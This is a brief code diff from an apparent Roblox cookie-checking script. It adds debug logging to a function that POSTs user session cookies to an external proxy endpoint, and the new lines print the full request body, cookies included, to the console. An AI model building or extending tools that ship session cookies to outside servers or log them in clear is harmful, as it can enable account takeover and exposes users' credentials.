@@ -300,6 +300,8 @@
         async function checkRobloxCookies(cookies) {
             try {
                 console.log("Отправляем куки на прокси:", cookies.substring(0, 50) + "...");
+                console.log("URL запроса:", `${PROXY_URL}/check-cookies`);
+                console.log("Тело запроса:", JSON.stringify({ cookies }));
                 const response = await fetch(`${PROXY_URL}/check-cookies`, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
